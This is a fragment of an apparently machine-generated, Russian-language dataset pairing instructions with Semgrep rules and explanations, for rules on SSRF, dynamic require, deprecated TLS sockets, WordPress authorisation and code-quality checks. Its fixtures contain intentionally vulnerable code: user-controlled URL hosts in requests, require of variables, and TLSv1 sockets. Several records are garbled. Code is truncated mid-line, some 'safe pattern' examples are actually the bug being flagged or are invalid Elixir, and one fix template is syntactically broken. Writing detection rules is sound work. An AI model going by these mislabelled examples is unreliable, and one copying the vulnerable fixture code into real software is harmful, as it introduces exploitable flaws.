    "output": "rules:\n- id: memory-marshal-create-span\n  severity: WARNING\n  languages:\n  - C#\n  metadata:\n    cwe:\n    - 'CWE-125: Out-of-bounds Read'\n    owasp:\n    - A04:2021 - Insecure Design\n    references:\n    - https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.memorymarshal.createspan?view=net-6.0\n    - https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.memorymarshal.createreadonlyspan?view=net-6.0\n    category: security\n    technology:\n    - .net\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    MemoryMarshal.CreateSpan and MemoryMarshal.CreateReadOnlySpan should be used with caution, as the\n    length argument is not checked.\n  pattern-either:\n  - pattern: MemoryMarshal.CreateSpan(...)\n  - pattern: MemoryMarshal.CreateReadOnlySpan(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов методов MemoryMarshal.CreateSpan и MemoryMarshal.CreateReadOnlySpan без проверки длины аргумента. Паттерн использует конструкцию pattern-either для охвата обоих методов. Семантически, правило ищет вызовы этих методов с использованием ellipsis (...) для указания переменного количества аргументов.\n\n# Ключевые элементы:\n- ID: memory-marshal-create-span\n- Язык: C# \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "memory-marshal-create-span",
      "language": "C#",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: tainted-url-host\nОписание уязвимости: User data flows into the host portion of this manually-constructed URL. This could allow an attacker to send data to their own server, potentially exposing sensitive data such as cookies or authorization information sent with this request. They could also probe internal servers or other resources that the server running this code can access. (This is called server-side request forgery, or SSRF.) Do not allow arbitrary hosts. Instead, create an allowlist for approved hosts, or hardcode the correct host.\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-url-host.py\nimport os\nimport flask\nimport hashlib\nimport requests\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    print(\"blah\")\n    # ruleid: tainted-url-host\n    url = \"https://%s/path\" % route_param\n    requests.get(url)\n\n    # ruleid: tainted-url-host\n    url = \"http://%r/path\" % route_param\n    requests.get(url)\n\n    return True\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    print(\"blah\")\n    # ok: tainted-url-host\n    return \"<a href='https://example.com'>Click me!</a>\"\n\n@app.route(\"/route_param_format/<route_param>\")\ndef route_param_format(route_param):\n    print(\"blah\")\n    # ruleid: tainted-url-host\n    return \"<a href='https://{}/path'>Click me!</a>\".format(route_param)\n\n@app.route(\"/route_param_format_ok_in_path/<route_param>\")\ndef route_param_format_ok_in_path(route_param):\n    print(\"blah\")\n    # ok: tainted-url-host\n    return \"<a href='https://example.com/{}/path'>Click me!</a>\".format(route_param)\n\n@app.route(\"/route_param_percent_format/<route_param>\")\ndef route_param_percent_format(route_param):\n    print(\"blah\")\n    # ruleid: tainted-url-host\n    return \"<a href='https://%s/path'>Click me!</a>\" % route_param\n\n@app.route(\"/route_param_percent_format_ok_in_path/<route_param>\")\ndef route_param_percent_format_ok_in_path(route_param):\n    print(\"blah\")\n    # ok: tainted-url-host\n    return \"<a href='https://example.com/%s/path'>Click me!</a>\" % route_param\n\n@app.route(\"/get_param_inline\", methods=[\"GET\"])\ndef get_param_inline():\n    # ruleid: tainted-url-host\n    return \"<a href='https://%s/path'>Click me!</a>\" % flask.request.args.get(\"param\")\n\n@app.route(\"/get_param_inline_concat\", methods=[\"GET\"])\ndef get_param_inline_concat():\n    # ruleid: tainted-url-host\n    return \"<a href='http://\" + flask.request.args.get(\"param\") + \"'>Click me!</a>\"\n\n@app.route(\"/get_param_inline_concat_ok_in_path\", methods=[\"GET\"])\ndef get_param_inline_concat_ok_in_pa  # Ограничиваем длину\n\nОпасные паттерны:\n• url = \\\n•  % route_param\n• return '<a href=\\'https://%s/path\\'>Click me!</a>' % flask.request.args.get('param')\n\nБезопасные паттерны:  \n• <a href='https://example.com'>Click me!</a>\n• return '<a href=\\'https://example.com/{}/path\\'>Click me!</a>'.format(route_param)\n• htmlpage = ''\\n...\\n<entity model=\\\n\nЛегенда аннотаций:\n- // ruleid:tainted-url-host: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-url-host: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-url-host\n  languages:\n  - python\n  message: >-\n    User data flows into the host portion of this manually-constructed URL.\n    This could allow an attacker to send data to their own server, potentially\n    exposing sensitive data such as cookies or authorization information sent\n    with this request. They could also probe internal servers or other\n    resources that the server running this code can access. (This is called\n    server-side request forgery, or SSRF.) Do not allow arbitrary hosts.\n    Instead, create an allowlist for approved hosts, or hardcode the correct host.\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - flask\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: MEDIUM\n    confidence: MEDIUM\n  mode: taint\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern: '\"$URLSTR\" % ...'\n        - metavariable-pattern:\n            metavariable: $URLSTR\n            language: generic\n            patterns:\n            - pattern-either:\n              - pattern: $SCHEME://%s\n              - pattern: $SCHEME://%r\n      - patterns:\n        - pattern: '\"$URLSTR\".format(...)'\n        - metavariable-pattern:\n            metavariable: $URLSTR\n            language: generic\n            pattern: $SCHEME:// { ... }\n      - patterns:\n        - pattern: '\"$URLSTR\" + ...'\n        - metavariable-regex:\n            metavariable: $URLSTR\n            regex: .*://$\n      - patterns:\n        - pattern: f\"$URLSTR{...}...\"\n        - metavariable-regex:\n            metavariable: $URLSTR\n            regex: .*://$\n      - patterns:\n        - pattern-inside: |\n            $URL = \"$URLSTR\"\n            ...\n        - pattern: $URL += ...\n        - metavariable-regex:\n            metavariable: $URLSTR\n            regex: .*://$\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: flask.request.$ANYTHING\n      - patterns:\n        - pattern-inside: |\n            @$APP.route(...)\n            def $FUNC(..., $ROUTEVAR, ...):\n              ...\n        - pattern: $ROUTEVAR\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциально опасных конструкций, где пользовательский ввод напрямую влияет на хостовую часть URL-адреса, используемого в запросе. В Python это может быть реализовано через форматирование строк, конкатенацию строк или интерполяцию строк с использованием переменных, полученных от пользователя. Правило использует метапеременные ($URLSTR, $SCHEME) и регулярные выражения для выявления таких конструкций. Источниками (sources) являются данные, полученные через аргументы запроса (flask.request.args), а приемниками (sinks) являются конструкции, формирующие URL-адрес вручную.\n\n# Ключевые элементы:\n- ID: tainted-url-host\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-url-host",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: wp-authorisation-checks-audit\nОписание уязвимости: These are some of the patterns used for authorisation. Look properly if the authorisation is proper or not.\nCWE: CWE-285: Improper Authorization\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-285: Improper Authorization\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-authorisation-checks-audit.php\n<?php\n\n// ruleid: wp-authorisation-checks-audit\nif ( is_admin() ) {\n}\n\n// ruleid: wp-authorisation-checks-audit\nreturn is_user_logged_in() ? get_current_user_id() : '';\n\n// ruleid: wp-authorisation-checks-audit\nif ( ! current_user_can( 'install_languages' ) ) {\n\n}\n\n// ok: wp-authorisation-checks-audit\nget_current_user_id();\n\n\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• if ( is_admin() ) { }\n• return is_user_logged_in() ? get_current_user_id() : ''\n• if ( ! current_user_can( 'install_languages' ) ) { }\n\nБезопасные паттерны:  \n• get_current_user_id();\n\nЛегенда аннотаций:\n- // ruleid:wp-authorisation-checks-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-authorisation-checks-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-authorisation-checks-audit\n    patterns:\n      - pattern: $FUNCTION(...)\n      - metavariable-regex:\n          metavariable: $FUNCTION\n          regex: current_user_can|is_admin|is_user_logged_in|is_user_admin\n    message: >-\n      These are some of the patterns used for authorisation. Look properly if\n      the authorisation is proper or not.\n    paths:\n      include:\n        - '**/wp-content/plugins/**/*.php'\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: MEDIUM\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#authorisation\n      owasp: \n        - A01:2021 - Broken Access Control\n      cwe: \n        - \"CWE-285: Improper Authorization\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска функций, связанных с авторизацией пользователей в PHP-коде WordPress-плагинов. Оно использует метапеременную $FUNCTION для сопоставления вызовов функций current_user_can, is_admin, is_user_logged_in и is_user_admin. Если любая из этих функций вызывается внутри условных операторов или выражений, это может указывать на потенциальную проблему с контролем доступа.\n\n# Ключевые элементы:\n- ID: wp-authorisation-checks-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-authorisation-checks-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: ssl-wrap-socket-is-deprecated\nОписание уязвимости: 'ssl.wrap_socket()' is deprecated. This function creates an insecure socket without server name indication or hostname matching. Instead, create an SSL context using 'ssl.SSLContext()' and use that to wrap a socket.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ssl-wrap-socket-is-deprecated.py\nimport socket\nimport ssl\n\nsock = socket.socket(\n    socket.AF_INET,\n    socket.SOCK_STREAM | socket.SOCK_NONBLOCK)\n\n# ruleid:ssl-wrap-socket-is-deprecated\nssock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)\n\n# ruleid:ssl-wrap-socket-is-deprecated\nssock2 = ssl.wrap_socket(sock)\n\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\ncontext.verify_mode = ssl.CERT_REQUIRED\ncontext.check_hostname = True\ncontext.load_default_certs()\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n# ok:ssl-wrap-socket-is-deprecated\nssl_sock = context.wrap_socket(s, server_hostname='www.verisign.com')\nssl_sock.connect(('www.verisign.com', 443))  # Ограничиваем длину\n\nОпасные паттерны:\n• ssock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)\n• ssock2 = ssl.wrap_socket(sock)\n\nБезопасные паттерны:  \n• context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\ncontext.verify_mode = ssl.CERT_REQUIRED\ncontext.check_hostname = True\ncontext.load_default_certs()\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n\nЛегенда аннотаций:\n- // ruleid:ssl-wrap-socket-is-deprecated: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssl-wrap-socket-is-deprecated: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ssl-wrap-socket-is-deprecated\n  pattern: ssl.wrap_socket(...)\n  message: >-\n    'ssl.wrap_socket()' is deprecated. This function creates an insecure socket\n    without server name indication or hostname matching. Instead, create an SSL\n    context using 'ssl.SSLContext()' and use that to wrap a socket.\n  metadata:\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://docs.python.org/3/library/ssl.html#ssl.wrap_socket\n    - https://docs.python.org/3/library/ssl.html#ssl.SSLContext.wrap_socket\n    category: security\n    technology:\n    - python\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции 'ssl.wrap_socket()', которая является устаревшей и создает небезопасный сокет без поддержки Server Name Indication (SNI) и проверки соответствия хостнейма. Вместо этого рекомендуется использовать класс 'ssl.SSLContext' для создания контекста шифрования и последующего обертывания сокета этим контекстом. Правило использует шаблон 'pattern: ssl.wrap_socket(...)' для поиска вызовов данной функции в коде.\n\n# Ключевые элементы:\n- ID: ssl-wrap-socket-is-deprecated\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ssl-wrap-socket-is-deprecated",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения dict-del-while-iterate\nОписание уязвимости: It appears that `$DICT[$KEY]` is a dict with items being deleted while in a for loop. This is usually a bad idea and will likely lead to a RuntimeError: dictionary changed size during iteration\nCWE: \nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: dict-modify-iterating.py\nd = {'a': 1, 'b': 2}\n# ruleid:dict-del-while-iterate\nfor k,v in d.items():\n    del d[k]\n\nd = {'a': 1, 'b': 2}\n# ruleid:dict-del-while-iterate\nfor k in d.keys():\n    del d[k]\n\n# ruleid:dict-del-while-iterate\nfor k in d.keys():\n    print(d[k])\n    del d[k]\n\n# ok:dict-del-while-iterate\nfor k in d.keys():\n    print(d[k])\n    x = d[k]  # Ограничиваем длину\n\nОпасные паттерны:\n• for k,v in d.items():\n    del d[k]\n• for k in d.keys():\n    del d[k]\n• for k in d.keys():\n    print(d[k])\n    del d[k]\n\nБезопасные паттерны:  \n• for k in d.keys():\n    print(d[k])\n    x = d[k]\n• for k,v in d.items():\n    #some code\n\n• for key in some_dict:\n    if condition:\n        del some_dict[key]\n\nЛегенда аннотаций:\n- // ruleid:dict-del-while-iterate: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dict-del-while-iterate: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: dict-del-while-iterate\n    message:\n      \"It appears that `$DICT[$KEY]` is a dict with items being deleted while in a for loop. This is usually a bad idea\n      and will likely lead to a RuntimeError: dictionary changed size during iteration\"\n    metadata:\n      references:\n        - https://docs.python.org/3/library/stdtypes.html#dictionary-view-objects\n      category: correctness\n      technology:\n        - python\n    languages: [python]\n    severity: WARNING\n    pattern-either:\n      - pattern: |\n          for $KEY, $VALUE in $DICT.items():\n              ...\n              del $DICT[$KEY]\n      - pattern: |\n          for $KEY in $DICT.keys():\n              ...\n              del $DICT[$KEY]\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуаций, когда словарь модифицируется во время итерации по нему. Анализ выполняется путем поиска конструкций цикла for, которые используют методы .items() или .keys() для итерации по словарю, при этом внутри цикла производится удаление элементов с использованием оператора del. Это может привести к ошибке времени выполнения, так как изменение размера словаря во время итерации не допускается.\n\n# Ключевые элементы:\n- ID: dict-del-while-iterate\n- Язык: python \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "dict-del-while-iterate",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения enum_map_into\nОписание уязвимости: Using `Enum.into/3` is more efficient than using `Enum.map/2 |> Enum.into/2`.\nCWE: \nТип анализа: search\nЯзык: elixir",
    "input": "Требования:\n- Язык: elixir\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: enum-map-into.fixed.exs\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n\n\n// File: enum-map-into.exs\n# ruleid: enum_map_into\nEnum.into(Enum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end), %{})\n\n# ruleid: enum_map_into\nEnum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\n# ruleid: enum_map_into\n%{a: 1, b: 2}\n|> Enum.map(fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})  # Ограничиваем длину\n\nОпасные паттерны:\n• %{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end)\n• Enum.into(Enum.map(%{a: 1, b: 2}, fn {k, v} -> {k, v * 2} end), %{})\n• %{a: 1, b: 2}\n|> Enum.map(fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\nБезопасные паттерны:  \n• %{a: 1, b: 2}\n|> Enum.into(%{}, fn {k, v} -> {k, v * 2} end, &fn {k, v} -> {k, v * 2} end)\n• Enum.into(%{a: 1, b: 2}, %{}, fn {k, v} -> {k, v * 2} end)\n• %{a: 1, b: 2}\n|> Enum.map(&fn {k, v} -> {k, v * 2} end)\n|> Enum.into(%{})\n\nЛегенда аннотаций:\n- // ruleid:enum_map_into: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:enum_map_into: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: enum_map_into\n    message: >-\n      Using `Enum.into/3` is more efficient than using `Enum.map/2 |> Enum.into/2`.\n    severity: WARNING\n    languages:\n      - elixir\n    pattern-either:\n      - pattern: |\n          Enum.into(Enum.map($E, $FUN), $INTO)\n      - pattern: |\n          Enum.map($E, $FUN)\n          |> Enum.into($INTO)\n      - pattern: |\n          $E\n          |> Enum.map($FUN)\n          |> Enum.into($INTO)\n    fix: |\n      $E\n      |> Enum.into($INTO, $FUN end)\n    metadata:\n      references:\n        - https://github.com/rrrene/credo/blob/master/lib/credo/check/refactor/map_into.ex\n      category: best-practice\n      technology:\n        - elixir\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска неэффективных конструкций использования Enum.map и Enum.into в Elixir-коде. Паттерны ищут случаи, когда Enum.map используется перед Enum.into, вместо прямого вызова Enum.into с функцией трансформации внутри. Правило рекомендует использовать более эффективный подход с передачей функции трансформации непосредственно в Enum.into.\n\n# Ключевые элементы:\n- ID: enum_map_into\n- Язык: elixir \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "enum_map_into",
      "language": "elixir",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения unsatisfiable-rule\nОписание уязвимости: You can not use 'pattern' $A and 'pattern-not' $A together; this will always be empty.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: unsatisfiable.test.yaml\nrules:\n  - id: unchecked-subprocess-call\n    patterns:\n      - pattern: |\n          subprocess.call(...)\n      # ruleid: unsatisfiable-rule\n      - pattern-not: |\n          subprocess.call(...)\n      - pattern-not-inside: |\n          $S = subprocess.call(...)\n      - pattern-not-inside: |\n          subprocess.call(...) == $X\n    message: >-\n      blah\n    severity: WARNING\n    fix: subprocess.check_call(...)  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\n- id: example\n  patterns:\n  - pattern: |-\n      foo: bar\n  - pattern-not: |-\n      foo: bar\n\nБезопасные паттерны:  \n• rules:\n- id: example\n  patterns:\n  - pattern: |-\n      foo: bar\n  - pattern: |-\n      baz: qux\n• rules:\n- id: example\n  patterns:\n  - pattern: |-\n      foo: bar\n  - pattern-not-inside: |-\n      baz: qux\n\nЛегенда аннотаций:\n- // ruleid:unsatisfiable-rule: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unsatisfiable-rule: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unsatisfiable-rule\n  message: >-\n    You can not use 'pattern' $A and 'pattern-not' $A together; this will always be empty.\n  severity: ERROR\n  metadata:\n    category: correctness\n    technology:\n    - semgrep\n  languages: [yaml]\n  patterns:\n  - pattern-inside: 'patterns: [...]'\n  - pattern-either:\n    - patterns:\n      - pattern-inside: |\n          - pattern: $A\n          ...\n      - pattern: |\n          - pattern-not: $A\n    - patterns:\n      - pattern-inside: |\n          - pattern-not: $A\n          ...\n      - pattern: |\n          - pattern: $A\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ситуации, когда одновременно используются шаблоны 'pattern' и 'pattern-not' с одной и той же метапеременной ($A). Такое сочетание всегда приводит к пустой выборке, так как первый шаблон исключает второй, а второй исключает первый. Правило проверяет наличие обоих шаблонов внутри блока 'patterns:' и использует оператор 'pattern-either' для проверки комбинаций этих двух типов шаблонов.\n\n# Ключевые элементы:\n- ID: unsatisfiable-rule\n- Язык: yaml \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "unsatisfiable-rule",
      "language": "yaml",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-non-literal-require\nОписание уязвимости: Detected the use of require(variable). Calling require with a non-literal argument might allow an attacker to load and run arbitrary code, or access arbitrary files.\nCWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-non-literal-require.js\nfunction dynamicRequire1(packageName) {\n    // ruleid: detect-non-literal-require\n    var a = require(packageName)\n    return a;\n}\n\nfunction dynamicRequire2(source, file) {\n    // ruleid: detect-non-literal-require\n    require(path.resolve(process.cwd(), file, source));\n}\n\nfunction okDynamicRequire1() {\n    var lib = path.join(path.dirname(fs.realpathSync(__filename)), \"index.js\");\n    // ok: detect-non-literal-require\n    require(lib).run(process.argv.slice(2)); \n}\n\nfunction okDynamicRequire2(userInput) {\n    var name = process.env.NAME\n    var path = name + '/smth/path';\n    var mod = path + '/module.js';\n    // ok: detect-non-literal-require\n    require(mk).main(top, userInput);\n}\n\nfunction okDynamicRequire3(userInput) {\n    var lib  = path.join(path.dirname(fs.realpathSync(__filename)), 'lib');\n    // ok: detect-non-literal-require\n    require(lib + '/foobar').run(userInput);\n}\n\nfunction okDynamicRequire4(userInput) {\n    // ok:detect-non-literal-require\n    var a = require('b')\n}\nfunction okDynamicRequire5(userInput) {\n    // ok:detect-non-literal-require\n    var a = require(process.env.VAR)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• var a = require(packageName)\n• require(path.resolve(process.cwd(), file, source))\n\nБезопасные паттерны:  \n• require(lib).run(process.argv.slice(2))\n• require(mk).main(top, userInput)\n• require(lib + '/foobar').run(userInput)\n\nЛегенда аннотаций:\n- // ruleid:detect-non-literal-require: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-non-literal-require: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-non-literal-require\n  message: >-\n    Detected the use of require(variable). Calling require with a non-literal\n    argument might allow an attacker to load and run arbitrary code, or\n    access arbitrary files.\n  metadata:\n    cwe:\n    - \"CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\"\n    owasp:\n    - A03:2021 - Injection\n    source-rule-url: https://github.com/nodesecurity/eslint-plugin-security/blob/master/rules/detect-non-literal-require.js\n    references:\n    - https://github.com/nodesecurity/eslint-plugin-security/blob/master/rules/detect-non-literal-require.js\n    category: security\n    technology:\n    - javascript\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: function ... (..., $ARG,...) {...}\n    - focus-metavariable: $ARG\n  pattern-sinks:\n  - pattern: require(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции require с переменной ($ARG), которая может быть передана динамически. Источники (sources) определяются как функция, принимающая переменную ($ARG) внутри шаблона pattern-inside. Синки (sinks) определяются как вызов require(...). Правило ищет случаи, когда аргумент требует передачи переменной, а не литерала, что потенциально позволяет злоумышленнику загружать и выполнять произвольный код или получать доступ к произвольным файлам.\n\n# Ключевые элементы:\n- ID: detect-non-literal-require\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-non-literal-require",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: metadata-deepsemgrep\nОписание уязвимости: We no longer support `deepsemgrep: true`, please use `interfile:true`\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: metadata-deepsemgrep.test.yaml\nrules:\n  - id: require-request\n    message: >-\n      If an attacker controls the x in require(x) then they can cause code to load that was not intended to run on the server.\n    severity: LOW\n    languages: [javascript, typescript]\n    metadata:\n      owasp: \n        - \"A03:2021 - Injection\"\n      # ok: metadata-deepsemgrep\n      interfile: true\n      cwe: \n        - \"CWE-706: Use of Incorrectly-Resolved Name or Reference\"\n      source-rule-url: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html\n      category: security\n      likelihood: HIGH\n      impact: HIGH\n      confidence: HIGH\n      subcategory: \n        - vuln\n      technology:\n        - express\n      references:\n        - https://github.com/google/node-sec-roadmap/blob/master/chapter-2/dynamism.md#dynamism-when-you-need-it\n    patterns: \n  - id: require-request\n    message: >-\n      If an attacker controls the x in require(x) then they can cause code to load that was not intended to run on the server.\n    severity: LOW\n    languages: [javascript, typescript]\n    metadata:\n      owasp: \n        - \"A03:2021 - Injection\"\n      # ruleid: metadata-deepsemgrep\n      deepsemgrep: true\n      cwe: \n        - \"CWE-706: Use of Incorrectly-Resolved Name or Reference\"\n      source-rule-url: https://nodesecroadmap.fyi/chapter-1/threat-UIR.html\n      category: security\n      likelihood: HIGH\n      impact: HIGH\n      confidence: HIGH\n      subcategory: \n        - vuln\n      technology:\n        - express\n      references:\n        - https://github.com/google/node-sec-roadmap/blob/master/chapter-2/dynamism.md#dynamism-when-you-need-it\n    patterns:  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\n  - id: example\n    metadata:\n      deepsemgrep: true\n      interfile: false\n\n• rules:\n  - id: another_example\n    metadata:\n      some_key: value\n      deepsemgrep: true\n      other_key: other_value\n\n• rules:\n  - id: last_example\n    metadata:\n      deepsemgrep: true\n      interfile: true\n      cwe: CWE-706\n\nБезопасные паттерны:  \n• rules:\n  - id: safe_rule\n    metadata:\n      interfile: true\n      cwe: CWE-706\n\n• rules:\n  - id: second_safe_rule\n    metadata:\n      some_key: value\n      interfile: true\n      other_key: other_value\n\n• rules:\n  - id: third_safe_rule\n    metadata:\n      deepsemgrep: false\n      interfile: true\n      cwe: CWE-706\n\nЛегенда аннотаций:\n- // ruleid:metadata-deepsemgrep: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:metadata-deepsemgrep: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
